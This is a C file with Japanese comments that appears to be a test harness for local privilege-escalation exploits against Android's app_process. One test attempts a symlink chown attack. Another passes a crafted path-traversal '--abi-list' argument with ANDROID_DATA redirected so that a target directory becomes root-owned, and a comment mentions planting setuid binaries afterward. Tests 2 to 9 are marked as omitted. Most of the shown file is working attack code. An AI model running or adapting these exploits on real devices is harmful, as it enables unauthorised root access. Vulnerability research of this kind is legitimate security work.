#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include "tests.h"

// ========== 既存テスト (1-9) は前回と同様だが、冗長を避け簡略化 ==========
// (実際のコードではこれらを完全に実装)

void test_symlink_chown(const char *app_path) {
    printf("\n[TEST-1] シンボリックリンク chown 攻撃\n");
    setup_test_environment();
    uid_t before, after;
    if (check_file_owner(TARGET_DIR, &before, NULL) == 0)
        printf("  変更前: %s (uid=%d)\n", TARGET_DIR, before);
    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };
    int ret = run_app_process(app_path, argv, envp);
    printf("  app_process 終了コード: %d\n", ret);
    if (check_file_owner(TARGET_DIR, &after, NULL) == 0) {
        printf("  変更後: %s (uid=%d)\n", TARGET_DIR, after);
        if (after == 0) printf("  [!] 脆弱性確認！\n");
        else printf("  [-] 失敗\n");
    }
    cleanup_test_environment();
}

// ... 他のテスト (2-9) も同様に実装（省略）...

/* ================================================================
 * テスト10: --abi-list を使ったパストラバーサル
 * ================================================================ */
void test_path_traversal_chown(const char *app_path) {
    printf("\n[TEST-10] パストラバーサルによる chown 誘導\n");
    setup_test_environment();

    // ターゲットディレクトリの所有者を確認
    uid_t uid_before;
    if (check_file_owner(TARGET_DIR, &uid_before, NULL) == 0) {
        printf("  変更前: %s (uid=%d)\n", TARGET_DIR, uid_before);
    }

    // 相対パスで CACHE_DIR へ到達するような --abi-list を構築
    // 例: ANDROID_DATA=/data/local/tmp/exploit_test
    // 構築されるパス: /data/local/tmp/exploit_test/dalvik-cache/../../../../data/local/tmp/exploit_test/target_dir
    // これは TARGET_DIR に正規化される
    char *traversal = "../../../../data/local/tmp/exploit_test/target_dir";
    char abi_arg[256];
    snprintf(abi_arg, sizeof(abi_arg), "--abi-list=%s", traversal);

    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, abi_arg, NULL };

    printf("  --abi-list にパストラバーサルを指定: %s\n", abi_arg);
    int ret = run_app_process(app_path, argv, envp);
    printf("  app_process 終了コード: %d\n", ret);

    uid_t uid_after;
    if (check_file_owner(TARGET_DIR, &uid_after, NULL) == 0) {
        printf("  変更後: %s (uid=%d)\n", TARGET_DIR, uid_after);
        if (uid_after == 0) {
            printf("  [!] 成功！TARGET_DIR が root に変更されました！\n");
            // このディレクトリ内に setuid バイナリを配置可能（ただし /data は nosuid）
        } else {
            printf("  [-] 権限変更なし (カーネルが保護)\n");
        }
    }
    cleanup_test_environment();
}
